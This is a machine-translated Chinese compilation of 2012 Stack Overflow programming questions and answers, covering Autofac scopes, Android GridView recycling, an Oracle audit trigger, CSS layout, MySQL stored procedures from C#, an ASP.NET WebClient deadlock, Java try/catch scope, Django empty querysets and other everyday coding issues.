> 从请求实例的范围中看不到具有与**“httpRequest”**匹配的标记的范围。这通常表明注册为 per-HTTP 请求的组件正在被 SingleInstance() 组件（或类似场景）请求。在 Web 集成下，始终从 DependencyResolver.Current 或 ILifetimeScopeProvider.RequestLifetime 请求依赖项，而不是从容器本身.

然后，当我阅读 Alex Meyer-Gleaves 的评论时：

> 我怀疑您正在使用带有 MVC3 的 Web API 包，这导致了问题。在 MVC3 集成中，InstancePerHttpRequest 生命周期范围的标记是“httpRequest”。在 MVC4 Beta 和 Web API Beta 包中，我更改了 InstancePerHttpRequest 和 InstancePerApiRequest 以使用通用标签“AutofacWebRequest”。您可以使用 Autofac.Mvc4 从 NuGet 获取 MVC4 集成包。

[带有评论的源文章](http://alexmg.com/post/2012/03/08/Autofac-ASPNET-Web-API-%28Beta%29-Integration.aspx)

所以按照亚历克斯的建议，我得到了这个包`Autofac.Mvc4`，但它只适用于 Mvc4，我的项目无法构建。然后我获取了 Autofac 的源代码来构建`Autofac.Mvc4`Mvc3：

```
hg clone https://code.google.com/p/autofac/ --branch "MVC4 beta" C:\my\path 
```

使用此程序集作为我的参考后`ApiController`开始工作，但常规`Controllers`工作仅适用于单个控制器操作调用。当视图调用 Html.RenderAction(...) 并且当我刷新或导航到另一个控制器操作时，它会因以下错误而崩溃：

> 从请求实例的范围中看不到带有与**“AutofacWebRequest”**匹配的标记的范围。这通常表明注册为 per-HTTP 请求的组件正在被 SingleInstance() 组件（或类似场景）请求。在 Web 集成下，始终从 DependencyResolver.Current 或 ILifetimeScopeProvider.RequestLifetime 请求依赖项，而不是从容器本身.

我认为从`Autofac.Mvc4`针对 Mvc3 的 2.6.2.859 版本的最新源构建可能会有所帮助，但我找不到源。或者这里可能有其他问题？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-28T12:03:44.753

我发现了问题。我还曾经`Autofac.Integration.Web`将依赖项注入到自定义成员资格和角色提供程序中。但是`WebLiftime.cs`里面有这样一行：

```
public static readonly object Request = "httpRequest"; 
```

一旦我将其更改为：

```
public static readonly object Request = "AutofacWebRequest"; 
```

并使用构建的组件一切正常，我没有收到任何错误:)

我相信这个常数值应该与所有项目中的相同`Autofac.Integration.Web`，`Autofac.Integration.Mvc`并且'`Autofac.Integration.WebApi`对于 Mvc4，所以这应该是一个错误。

# android - GridView 中的 setImageResource 造成漏洞

> ID：11243501
> 
> 赞同：0
> 
> 时间：2012-06-28T11:21:12.217
> 
> 标签：android, gridview, layout-inflater

大家好，我有一个问题。我想用自定义 Loyout 做一个 GridView，所以我使用了 layoutInflater，我这样做了：

```
private ImageView prima;
private ImageView seconda;

public View getView(int position, View convertView, ViewGroup parent) {
        View v;
        if (convertView == null) {

            LayoutInflater li = getLayoutInflater();
            v = li.inflate(R.layout.icon, null);

            Display display = getWindowManager().getDefaultDisplay();
            int width = display.getWidth();

            prima = (ImageView) v.findViewById(R.id.imageView1);
            prima.getLayoutParams().height = width / 3;
            prima.getLayoutParams().width = width / 3;
            seconda = (ImageView) v.findViewById(R.id.imageView2);
            seconda.getLayoutParams().height = width / 3;
            seconda.getLayoutParams().width = width / 3;

            v.setLayoutParams(new GridView.LayoutParams(width / 3, width / 3));
            v.setPadding(0, 0, 0, 0);
        } else {
            v = convertView;
        }

        prima.setImageResource(mThumbIds[position]); //mThumbIds[] is an array with R.drawable.vip_0_mini, R.drawable.a_1, R.drawable.b_2, R.drawable.c_3 .....
        return v;

    }; 
```

当我运行我的应用程序时，图像是随机排列的，并且有很多没有图像的黑色空间。

我做错了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:32:40.213

你的`View`和`convertView`没有链接。试试`ViewHolder concept`这样：

```
public View getView(int position, View convertView, ViewGroup parent) {
        ViewHolder v;
        if (convertView == null) {

            LayoutInflater li = getLayoutInflater();
            convertView  = li.inflate(R.layout.icon, null);

            Display display = getWindowManager().getDefaultDisplay();
            int width = display.getWidth();

            v = new ViewHolder();
            v.prima = (ImageView) convertView .findViewById(R.id.imageView1);
            v.prima.getLayoutParams().height = width / 3;
            v.prima.getLayoutParams().width = width / 3;
            v.seconda = (ImageView) convertView .findViewById(R.id.imageView2);
            v.seconda.getLayoutParams().height = width / 3;
            v.seconda.getLayoutParams().width = width / 3;

            convertView .setLayoutParams(new GridView.LayoutParams(width / 3, width / 3));
            convertView .setPadding(0, 0, 0, 0);
            convertView.setTag(v);
        } else {
            v = (ViewHolder)convertView.getTag();
        }

        v.prima.setImageResource(mThumbIds[position]); //mThumbIds[] is an array with R.drawable.vip_0_mini, R.drawable.a_1, R.drawable.b_2, R.drawable.c_3 .....

         //v.seconda
        return convertView;

    };

class ViewHolder{
    ImageView prima;
    ImageView seconda;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:25:24.117

您忘记将图像应用于

```
 seconda = (ImageView) v.findViewById(R.id.imageView2);

    prima.setImageResource(....); 
```

# oracle - 遍历oracle表的列

> ID：11243504
> 
> 赞同：0
> 
> 时间：2012-06-28T11:21:25.627
> 
> 标签：oracle, plsql, triggers, oracle11g

此触发器建议跟踪客户表上的旧值和新值。它只为每个更改的值列插入一个新行。想象一下有 25 列，我要写同样的东西 25 次。有没有办法在循环中做到这一点，或者有更好的方法来保持更通用。想象一下，如果任何新的列添加到客户表中，按照您告诉我的方式，将无需更改触发器。

```
 CREATE OR REPLACE TRIGGER KRD_CUSTOMER_UPD_DEL_TRG 
       BEFORE UPDATE OR DELETE ON KRD_CUSTOMER 
       FOR EACH ROW 
    DECLARE 
       V_ISLEMTIPI VARCHAR2(1); 
    BEGIN 
       IF UPDATING THEN 
           if      :OLD.CUSTOMERNAME <> :NEW.CUSTOMERNAME then
        krd_ins_customerTable(p_OldCustomerName => :OLD.CUSTOMERNAME,
                                    p_NewCustomerName => :NEW.CUSTOMERNAME);
       end if;
       end if;

    end; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:53:14.867

列名在视图中可用：user_tab_columns。

可行的方法：遍历此视图中的列名并构造一个字符串，其中包含必须为该特定列执行的语句。

```
l_statement := 'begin if :OLD.<columname> <> :NEW.<columname> then
        krd_ins_customerTable(p_Old<columname> => :OLD.<columname>,
                                    p_New<columname> => :NEW.<columname>); end;'

execute immediate l_statement; 
```

正如 Ollie 已经评论过的：要检查不相等，还要检查空值。

```
If (a is null and b is not null)
or (a is not null and b is null)
or (a is not null and b is not null and a!=b) 
```

# css - 绝对定位但调整父级大小

> ID：11243511
> 
> 赞同：3
> 
> 时间：2012-06-28T11:22:03.183
> 
> 标签：css, html

我正在尝试在一个 div 中编写一个带有 2 个 div 的 html。有一个没有宽度或高度的父div。宽度是浏览器宽度，高度没有指定。我想在这个父 div 中，有 2 个 div：第一个需要有一个宽度或 250 像素，第二个需要有屏幕的其余宽度。他们都缺少高度..取决于里面有多少内容。现在我试图让它像这样：

```
<div id="calendar">
        <section id="list">
        </section>

        <section id="grid">
        </section>
</div> 
```

和这样的CSS：

```
#calendar {
    margin: 0 auto;
    position: relative;
    overflow: hidden;
}
#calendar #list {
    background: #f00;
    position: absolute;
    width: 250px;
    left: 0;
    top: 0;
}
#calendar #grid {
    background: #0f0;
    position: absolute;
    left: 250px;
    top: 0;
    right: 0;
} 
```

现在的问题是，当我向子 div 添加内容时，父 div 不会调整大小

我希望 CSS 有一个解决方法来解决这个问题，因为通过 JS 来做会很糟糕。

提前谢谢你，丹尼尔！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:01:06.800

这是我的解决方案-> [http://tinkerbin.com/Z8mJmItU](http://tinkerbin.com/Z8mJmItU)

浮动具有给定宽度的#list，然后给#grid 相同的margin-left。

然后，要让两列看起来都具有父容器高度的 100%，您需要一个图像。在您必须使用“实际图像”之前。今天，您可以简单地依靠 css3 渐变作为背景，使您的页面加载速度更快（减少 1 个对图像的 http 请求）。它可能看起来更复杂，但实际上并不“那么”复杂。它甚至最终为您提供了更大的灵活性，因为您可以更改列的宽度和颜色，而无需创建新图像。您只需要更改css。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:23:19.557

如果要使用绝对高度，则需要指定高度。然后它应该工作。

**编辑**

采用

```
position: relative; 
```

在子元素上。

**编辑 2**

也许这篇文章会对你所追求的有所帮助？[Div 宽度 100% 减去固定数量的像素](https://stackoverflow.com/questions/651317/div-width-100-minus-fixed-amount-of-pixels)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T11:46:16.590

不要使用定位，使用 float ... 使用当前方法，父级将折叠，确定父级所需高度的唯一方法是计算最高子元素的高度（通常使用 JavaScript）。

```
<div id="calendar">
        <section id="list">
        </section>

        <section id="grid">
        </section>
        <div class="clear"></div>
</div> 
```

...和CSS ...

```
#calendar {
    margin: 0 auto;
    position: relative;
}
#calendar #list {
    background: #f00;
    float:left;
    width: 250px;
}
#calendar #grid {
    background: #0f0;
    margin-left: 250px;
}
.clear{
    clear:both;
} 
```

这样，#calendar 将在高度上调整到最高的子元素。还要记住删除溢出规则。

...为简明起见，您可能应该考虑使用 clearfix（通过向#calendar 添加一个类）-[在此处阅读更多内容](http://css-tricks.com/snippets/css/clear-fix/)。

# java - 富客户端对象管理

> ID：11243512
> 
> 赞同：0
> 
> 时间：2012-06-28T11:22:06.597
> 
> 标签：java, swing, jpa, rcp, entitymanager

我已经为此困扰了很长时间，希望有人能对我有所启发。

在 Swing/RCP 等富客户端平台上，如何管理从数据库中检索到的实体对象？

如果我不使用客户端/服务器架构，而是让客户端直接连接到数据库，那么在 JPA/EntityManager 的帮助下，效果会很好。在这种情况下，UI 上的所有实体对象都由 EntityManager 管理，它们之间的所有关系也都维护得很好，JPA 的 LazyInitialization Exception 也没有问题，因为 Client 和 EntityManager 在同一个 JVM 中。不会有具有相同实体的对象重复。

但是，如果我想将服务器与客户端分开，并且客户端 UI 只处理从实体映射的 DTO 对象，那么让这些 DTO 对象同步让我很头疼。每个服务器请求都会创建新的 DTO 对象，即使它们代表相同的服务器端实体。客户端DTO的关系也很脆弱。从同一实体的所有重复中不容易看出一个对象的变化。

是否有任何框架可以充当客户端 EntityManager，或者可以在这种情况下工作的缓存机制？任何建议将不胜感激！

问候，吴东

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T14:04:27.270

EclipseLink 支持 RemoteSession 体系结构，该体系结构将 EclipseLink Session 和 UnitOfWork 接口提供给与服务器端会话通信的远程客户端。

这在 JavaEE 和 web 服务之前很流行，在胖客户端三层架构时代。从那以后它就很少被使用，并且目前不支持 JPA。现在大多数人都有网络客户端而不是胖客户端，或者似乎更喜欢通过 DTO 或使用 XML 控制他们自己的客户端/服务器通信，所以我不确定远程 EntityManager 是最好的架构。

您可以在 EclipseLink 上记录此功能的增强功能，因为扩展现有 RemoteSession 并不难，或者您可以使用本机 EclipseLink API。

# c++ - 如何获得UPS的状态？

> ID：11243517
> 
> 赞同：-4
> 
> 时间：2012-06-28T11:22:32.303
> 
> 标签：c++, c

我需要从我的应用程序与 UPS 通信。我的系统已连接到 UPS，我需要获取该 UPS 的状态，这将帮助我识别该系统将要关闭，以便我可以备份我的文件。

我对此很陌生。所以请给我更多的想法如何做到这一点，如果你能分享一些 c/c++ 代码将非常有帮助。

如果有人需要更多详细信息，请告诉我。

谢谢，迪普什

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T12:14:54.887

如果您在应用程序域中，则根本不需要获取 UPS 的状态或与 UPS 交谈。

您应该响应操作系统对您的应用程序的请求以退出并执行您的应用程序认为必要的任何备份操作。如果您的目标系统连接到 UPS，则应设置它们，以便操作系统响应适当的“电池供电”或“电池电量低”信号。

这很重要，至少有两个原因。首先，您不会将您的应用程序绑定到特定的 UPS 接口、型号或供应商。其次，当非 UPS 启动的关机（应用程序或系统范围）发生时，您的应用程序将是健壮的。

额外的好处是响应操作系统退出请求很可能是您无论如何都要做的事情。

# c# - c#winform中的mysql存储过程

> ID：11243519
> 
> 赞同：-2
> 
> 时间：2012-06-28T11:22:41.093
> 
> 标签：c#, mysql, winforms, stored-procedures

我在带有一些插入语句的 mysql 数据库中创建了一个事务。如何将这些插入语句用作存储过程。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T13:09:09.403

以下可能有用...

## MySQL

```
drop table if exists users;
create table users
(
user_id int unsigned not null auto_increment primary key,
username varchar(32) unique not null
)
engine=innodb;

insert into users (username) values ('foo'),('test');

select * from users order by user_id;

drop procedure if exists update_user;

delimiter #
create procedure update_user
(
in p_user_id int unsigned,
in p_username varchar(32)
)
proc_main:begin
    update users set username = p_username where user_id = p_user_id; 
end proc_main #

delimiter ;

call update_user(2,'bar');

select * from users order by user_id; 
```

## C# 非存储过程（控制台示例）

```
using System;
using System.Collections.Generic;
using System.Text;
using System.Data;
using MySql.Data.MySqlClient;

namespace TransDemo
{
    class Program
    {
        static void Main(string[] args)
        {
            const string DB_CONN_STR = "Persist Security Info=False;Username=foo_dbo;Password=pass;database=foo_db;server=localhost;Connect Timeout=30";
            const int DB_TIMEOUT = 30;

            MySqlConnection cn = new MySqlConnection(DB_CONN_STR);
            MySqlCommand cmd = null;
            MySqlTransaction trx = null;

            Console.WriteLine("Updating...");

            try
            {
                cn.Open();
                string sqlCmd = "update users set username = @username where user_id = @user_id";

                cmd = new MySqlCommand(sqlCmd, cn);

                cmd.CommandType = CommandType.Text;
                cmd.CommandTimeout = DB_TIMEOUT;

                cmd.Parameters.AddWithValue("@username", "beta");
                cmd.Parameters.AddWithValue("@user_id", 2);

                cmd.Prepare();

                trx = cn.BeginTransaction();
                cmd.Transaction = trx;

                cmd.ExecuteNonQuery();

                trx.Commit();

                Console.WriteLine("Update complete");
            }
            catch (Exception ex)
            {
                if(trx != null) trx.Rollback();
                Console.WriteLine("oops - {0}", ex.Message);
            }
            finally
            {
                cn.Dispose();
            }
            Console.WriteLine("Press any key to quit");
            Console.ReadKey();
        }
    }
} 
```

## C# sproc（控制台示例）

```
using System;
using System.Collections.Generic;
using System.Text;
using System.Data;
using MySql.Data.MySqlClient;

namespace TransDemo
{
    class Program
    {
        static void Main(string[] args)
        {
            const string DB_CONN_STR = "Persist Security Info=False;Username=foo_dbo;Password=pass;database=foo_db;server=localhost;Connect Timeout=30";
            const int DB_TIMEOUT = 30;

            MySqlConnection cn = new MySqlConnection(DB_CONN_STR);
            MySqlCommand cmd = null;
            MySqlTransaction trx = null;

            Console.WriteLine("Updating...");

            try
            {
                cn.Open();
                string sqlCmd = "update_user";

                cmd = new MySqlCommand(sqlCmd, cn);

                cmd.CommandType = CommandType.StoredProcedure;
                cmd.CommandTimeout = DB_TIMEOUT;

                cmd.Parameters.AddWithValue("@p_username", "alpha");
                cmd.Parameters.AddWithValue("@p_user_id", 2);

                // cmd.Prepare(); // no need to prepare it's a stored proc

                trx = cn.BeginTransaction();
                cmd.Transaction = trx;

                cmd.ExecuteNonQuery();

                trx.Commit();

                Console.WriteLine("Update complete");
            }
            catch (Exception ex)
            {
                if(trx != null) trx.Rollback();
                Console.WriteLine("oops - {0}", ex.Message);
            }
            finally
            {
                cn.Dispose();
            }
            Console.WriteLine("Press any key to quit");
            Console.ReadKey();
        }
    }
} 
```

希望这可以帮助 ：）

* * *

# java - 哪个 noSQL DB 适合快速查询可变多字段？

> ID：11243530
> 
> 赞同：0
> 
> 时间：2012-06-28T11:23:20.540
> 
> 标签：java, performance, indexing, nosql

我有 1B 个用户的数据库，每个用户都有多个属性。例如：

```
{userid : 1, emails : {xx@xx.com, yy@yy.com, zz@zz.com}, countries : {Italy, France, USA}, food : {pasta}} 
```

每个属性可以包含多个值。

在网络应用程序的生命周期中，我想添加更多属性，例如：汽车、颜色......

所以一般来说，我会有 1B 个用户，每个用户都有 3-20 个属性 - 每个用户都有自己的属性子集，在 20 个可能的属性中。

最重要的是：

1.  尽可能快地执行以下查询：使用 email=xx@xx.com OR car=Mercedes OR food=pasta OR color=black OR color=blue OR userid=10 OR userid=20 找到我的所有用户。在每个查询中，我将查询不同的属性子集。

2.  能够很容易地向数据库添加新属性。即在某一天，我还想添加“性别”属性，并且我希望对这个属性的查询会很快。

3.  每个用户只有属性的子集

4.  查询将是“属性=值”。我不需要诸如“property>value”或“property start with value”之类的查询。我将所有值视为常量键。

5.  在很多情况下我会添加新用户，但最重要的是快速查询他们。

6.  应该是持久的、可扩展的、具有故障转移的

7.  如果有关系，我的网络应用程序将用 Java 编写

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:27:15.597

你说的快是什么意思？

大多数数据库会尽可能快地完成您想要的操作。除非您有特定的延迟要求，否则我会选择流行的 nosql 数据库，例如 mongodb。

为了获得更高的性能，您可以使用专为此类查询设计的 LDAP 数据库。如果您每秒有大约 100K+ 查询和 100K+ 用户，它们特别有用。

# php - 切换表时出现 zend db 错误可捕获的致命错误：传递给 __construct() 的参数 1 必须是数组、给定对象、调用

> ID：11243537
> 
> 赞同：1
> 
> 时间：2012-06-28T11:23:51.417
> 
> 标签：php, zend-framework, centos, zend-db, zend-db-table

在我的应用程序中，我设置了数据库连接。现在我想切换表并且我不断收到以下错误

```
Catchable fatal error: Argument 1 passed to Application_Model_PgeSeismicFile::__construct() must be an array, object given, called in /opt/eposdatatransfer/application/models/PgeSeismicFileMapper.php on line 58 and defined in /opt/eposdatatransfer/application/models/PgeSeismicFile.php on line 10 
```

我有两个表的两个模型。当我尝试访问第二个表时出现错误。访问和设置第一个表很好，我也是这样做的。这是我切换表格的方式。

```
private $_dbTable = null;

    public function setDbTable($dbTable, $path = false)
    {
        $project = $_REQUEST['username'];

        $filename = $path . "PSDB.db"; //APPLICATION_PATH . "/data/db/".$project."/PSDB.db";

        if (!file_exists($filename)) {
            //$this->_redirect('/');
            // need to redirect and pass eror message for user
            throw new Exception("File does not exist");
        }

        try{
            //exit("3");
            $dbAdapter = Zend_Db::factory("pdo_sqlite", array("dbname"=> $filename));
        }catch (Zend_Db_Adapter_Exception $e) {
            // perhaps a failed login credential, or perhaps the RDBMS is not running
            var_dump($e);
            exit("1");

        } catch (Zend_Exception $e) {
            // perhaps factory() failed to load the specified Adapter class
            var_dump($e);
            exit("2");
        }

        if (is_string($dbTable)) {
            print_r($dbAdapter);
            $dbTable = new $dbTable($dbAdapter);
            $dbTableRowset = $dbTable->find(1);
            $user1 = $dbTableRowset->current();
            //var_dump($user1);
            //exit("hello");
            //$row = $user1->findDependentRowset();
        }
        if (!$dbTable instanceof Zend_Db_Table_Abstract) {
            throw new Exception('Invalid table data gateway provided');
        }
        $this->_dbTable = $dbTable;
        //$session = new Zend_Session_Namespace();
        //$session->dbAdapter = $this->_dbTable;
        //var_dump($this);
        //exit();
        return $this;
    }

    public function getDbTable($path = false)
    {
        if (null === $this->_dbTable) {
            $session = new Zend_Session_Namespace();
            //$this->setDbTable('Application_Model_PgeSeismicFile',$path);
            $this->dbTable = new Application_Model_PgeSeismicFile($session->dbAdapter);
        }
        return $this->_dbTable;
    } 
```

它在这条线上出错

```
$this->dbTable = new Application_Model_PgeSeismicFile($session->dbAdapter); 
```

在我的会话中，我正在存储：

```
$dbAdapter = Zend_Db::factory("pdo_sqlite", array("dbname"=> $filename)); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T08:57:23.810

尝试这个

```
$dbAdapter = Zend_Db::factory("pdo_sqlite", array("dbname"=> $filename));

Zend_Db_Table::setDefaultAdapter($dbAdapter);

$this->dbTable = new Application_Model_PgeSeismicFile; 
```

# c# - ASP.NET MVC 中的 WebClient 死锁（同步动作方法）

> ID：11243539
> 
> 赞同：3
> 
> 时间：2012-06-28T11:23:59.390
> 
> 标签：c#, asp.net-mvc, asynchronous, task-parallel-library

```
public class HomeController : Controller
{
    public ActionResult Index()
    {
        Task<string> t = DownloadStringTaskAsync(new Uri("http://www.google.com/search?q=aspnet"));
        t.Wait();
        string res = t.Result;

        return View((object)res);
    }

    Task<string> DownloadStringTaskAsync(Uri address)
    {
        TaskCompletionSource<string> tcs = new TaskCompletionSource<string>();
        WebClient wc = new WebClient();
        wc.DownloadStringCompleted += (s, e) => tcs.SetResult(e.Result);
        wc.DownloadStringAsync(address);
        return tcs.Task;
    }
} 
```

该操作将永远不会返回，请求将简单地超时。

我们将 TPL 任务用​​于所有异步操作，并且必须包装一些 WebClient 的方法，直到我们切换到框架 4.5。

上述方法`DownloadStringTaskAsync`是其中一个包装器的简化版本。

我无法弄清楚为什么等待任务会使 aspnet 中的线程死锁并且在控制台或桌面应用程序中工作正常。

这是死锁线程的样子。

> ## 请求线程
> 
> [处于睡眠、等待或加入]
> mscorlib.dll!System.Threading.Monitor.Wait(object obj, int millisecondsTimeout, bool exitContext) + 0x18 bytes mscorlib.dll!System.Threading.ManualResetEventSlim.Wait(int millisecondsTimeout, System .Threading.CancellationToken cancelToken) + 0x264 字节
> mscorlib.dll!System.Threading.Tasks.Task.InternalWait(int millisecondsTimeout, System.Threading.CancellationToken cancelToken) + 0x166 字节 mscorlib.dll!System.Threading.Tasks.Task.Wait( int millisecondsTimeout, System.Threading.CancellationToken cancelToken) + 0x41 字节
> mscorlib.dll!System.Threading.Tasks.Task.Wait() + 0xb 字节
> TCSProblem.DLL!TCSProblem.Controllers.HomeController.Index() 第 16 行 + 0xa 字节
> 
> ## WebClient 线程
> 
> [在睡眠、等待或加入]
> mscorlib.dll!System.Threading.Monitor.Enter(object obj, ref bool lockTaken) + 0x14 字节
> System.Web.dll!System.Web.AspNetSynchronizationContext.CallCallback(System.Threading. SendOrPostCallback 回调，对象状态) + 0x53 字节
> System.Web.dll!System.Web.AspNetSynchronizationContext.Post(System.Threading.SendOrPostCallback 回调，对象状态) + 0x9 字节
> System.dll!System.ComponentModel.AsyncOperation.Post(System. Threading.SendOrPostCallback d，对象 arg) + 0x29 字节
> System.dll!System.Net.WebClient.PostProgressChanged(System.ComponentModel.AsyncOperation asyncOp, System.Net.WebClient.ProgressData 进度) + 0x25c 字节

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-06-28T11:33:49.657

不幸的是，WebClient 捕获了当前的同步上下文并通过发布到它来引发完成事件。因此，完成操作仅在您从您的操作方法返回后运行，这永远不会发生。这意味着，你要么...

1.  ...需要将您对 DownloadStringAsync 的调用包装在 Task.Factory.StartNew 中，以便切换到没有同步上下文的线程
2.  ...需要在调用前将 SynchronizationContext.Current 设置为 null，然后再恢复
3.  ...使用异步 MVC 操作

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-28T11:37:44.810

默认情况下，所有 .NET 类都捕获 SynchronizationContext，我遇到了类似的问题：[SmtpClient.SendAsync blocking my ASP.NET MVC Request](https://stackoverflow.com/questions/6935427/smtpclient-sendasync-blocking-my-asp-net-mvc-request)

# mysql - 如何检测和替换表格中的不可打印字符？

> ID：11243541
> 
> 赞同：0
> 
> 时间：2012-06-28T11:24:02.543
> 
> 标签：mysql, non-ascii-characters, system-stored-procedures

我已将 xls 文件中的数据导入表中。但有一些垃圾（非ASCII字符）。

我想从数据库中删除那些不可打印的字符。

这是我找到的查询，它可以选择具有非 ascii 字符的条目

```
 select * from TABLE where COLUMN regexp '[^ -~]'; 
```

但是如何使用 mysql 查询或过程从表中删除这些字符？

请提出建议。

提前致谢。

# java - Try...catch 块没有定义变量

> ID：11243545
> 
> 赞同：1
> 
> 时间：2012-06-28T11:24:15.660
> 
> 标签：java, try-catch

我有一个程序，它从`args[]`数组中获取一个参数，在 main 方法中定义，但有一个备份以防未定义，以 try...catch 块的形式，如果`ArrayIndexOutOfBounds`抛出异常，而是使用一种调用方法`getInt`来提示用户输入变量。但是，由于某种原因，当我尝试使用该变量时，我的编译器说它找不到它。我有以下代码：

```
try {
    int limit = Integer.parseInt(args[0]);
}
catch(ArrayIndexOutOfBoundsException e) {
    int limit = getInt("Limit? ");
}
int[] p = getPrimes(limit); 
```

`getPrimes`是我拥有的另一种方法，它返回从 2 到指定数字的素数数组（使用阿特金筛）。无论如何，当我编写`int[] p = getPrimes(limit);`并尝试编译时，它说未定义“限制”变量。请帮忙！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-06-28T11:25:32.197

您应该在块外声明它：

```
int limit;
try {
    limit = Integer.parseInt(stuff[0]);
}
catch(ArrayIndexOutOfBoundsException e) {
    limit = getInt("Limit? ");
}
int[] p = getPrimes(limit); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:25:47.257

在 catch 块外声明`limit`，目前在 catch 块范围内`catch{}`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-06-28T11:27:16.717

```
int limit;
try {
    limit = Integer.parseInt(stuff[0]);
}
catch(ArrayIndexOutOfBoundsException e) {
    limit = getInt("Limit? ");
}
int[] p = getPrimes(limit); 
```

在您的程序中，您创建了 2 个局部限制变量，一个在`try`块中，另一个在`catch`块中。

在 try 块之外声明它

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-28T11:27:50.810

在 try/catch 块之外定义限制变量，您无权访问外部 try 块内定义的变量。如果您在 try 块之外调用它，就像您在此处的情况一样，您还必须初始化它。

# php - 来自 DB 的动态 html 链接被字符串“损坏”了？

> ID：11243554
> 
> 赞同：0
> 
> 时间：2012-06-28T11:24:43.893
> 
> 标签：php, html

我正在创建一个电子邮件模板。基本上，几乎所有工作都运行良好。我将链接列表发送给用户。问题是有时，链接会在 href 属性的特定位置被“”（单个空格）破坏。

例如 - 这个链接：

```
http://www.mydomain.com/index.php?task=quickSearchModule&job_id=40 
```

变成：

```
http://www.mydomain.com/index.php?task=quic%20kSearchModule&job_id=40 
```

我设法发现这（似乎）与 <a> 和 </a> 标记之间的文本有关，通过在所有链接中放置一个常量，有问题的链接得到修复......

我试图过滤包含“”和“%20”链接的变量，但它没有帮助 - 它似乎在电子邮件客户端中呈现不好，而不是在字符串本身中呈现简单的东西。

我试图过滤 <a> 标记之间的文本本身是否有坏字符（我没有看到任何） - 没有工作（尝试了 html_entity_decode、preg_replace 的奇怪字符等等） - 没有。

更奇怪的是，在浏览器中相同的链接有效，但在电子邮件客户端（Gmail 和 Outlook）中 - 这就是问题出现的地方......

我的想法已经用完了，真的很喜欢和新的方向......

我的系统是 MySQL、PHP，当然还有 HTML。

谢谢！

*** 编辑 ***

我添加了用于返回每个作业的代码（每个链接都是一个作业）。我向它添加了一些过滤器并留下它以显示我尝试过的...

```
function getJobLink($job) {
$jobTitle = strip_tags($job['job_title']);
$invalid_characters = array("$", "%", "#", "<", ">", "|", "\\", '"', "'","",'"',"/");
$jobTitle = str_replace($invalid_characters, "", $jobTitle);
$jobTitle = htmlspecialchars_decode($jobTitle);
$jobTitle=strip_tags($jobTitle);
strstr($jobTitle,'/','');
strstr($jobTitle,'<  /td>','');
strstr($jobTitle,'&lt; /td&gt;','');

strstr($jobTitle,'"','');
strstr($jobTitle,'\\','');
strstr($jobTitle,"'",'');

$jobTitle = html_entity_decode($jobTitle);
//generate link and try to filter it 
$jobLink = 'http://www.mysite.com/index.php?task=quickSearchModule&amp;job_id='.$job['jid'];
$jobLink = str_replace(' ','',$jobLink);
$jobLink = str_replace('%20','',$jobLink);
$jobLink = trim($jobLink);

//create single job HTML link and text
$job = '<tr><td style="border: 1px #cccccc solid">'.$job['field_name'].'</td><td style="border: 1px #cccccc solid">'.$job['area_name'].'</td><td style="border: 1px #cccccc solid;">'.$job['position_name'].' - <a style="" href="'.$jobLink.'" target="_blank">'.trim($jobTitle).'</a></td></tr>'; 
return $job; 
```

}

再次感谢

# objective-c - 删除自定义 UITableviewCell 边框

> ID：11243556
> 
> 赞同：2
> 
> 时间：2012-06-28T11:24:59.633
> 
> 标签：objective-c, ios, xcode4, uitableview

我的 iPhone 项目中有一个`tableview`。该行的每个单元格都使用单独的`UITableViewCell`.

自定义单元格包含一个图像视图和一个标签。我的行高是 55，因此我的自定义表格高度也是 55。Imageview 作为单元格的背景，所以 imageview 高度也是 55。但是当我运行项目时，我可以看到每一行周围都有一个边框，这似乎是自定义的单元格在其内容周围有一个矩形边框。

我怎么能删除这个边界矩形。我在 xcode 4.2.1 和模拟器 5.0 中工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:34:56.187

是电池分离器吗？

```
tableView.separatorStyle = UITableViewCellSeparatorStyleNone; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-28T11:29:23.340

您看到的边框可能是分隔符，请尝试将此行添加到您的代码中

```
 tableView.separatorStyle = UITableViewCellSeparatorStyleNone; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-28T11:33:56.360

您需要设置单元格的背景视图-

```
cell.backgroundView = [[[UIView alloc] initWithFrame:CGRectZero] autorelease]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-29T07:44:42.007

实际上这是由于我加载的图像..它有一个阴影部分，显示为空白..抱歉给您带来麻烦。谢谢你们

# django - 在 django 表单字段中默认创建空查询集

> ID：11243559
> 
> 赞同：208
> 
> 时间：2012-06-28T11:25:02.790
> 
> 标签：django, django-forms

我有这个字段：

```
city = forms.ModelChoiceField(label="city", queryset=MyCity.objects.all())
district = forms.ModelChoiceField(label="district", queryset=MyDistrict.objects.all())
area = forms.ModelChoiceField(label="area", queryset=MyArea.objects.all()) 
```

区来自点击城市，面积来自点击区域。搭配 `queryset=MyDistrict.objects.all()`和`queryset=MyArea.objects.all()`形式会很沉重。默认情况下如何使查询集为空？

* * *

## 回答 #1

> 赞同：529
> 
> 时间：2012-06-28T12:12:29.617

您可以通过执行以下操作获得一个空的查询集：

```
MyModel.objects.none() 
```

虽然我不知道您将如何使用该表单，但您可以将其作为字段的查询集，以获得您需要的内容......

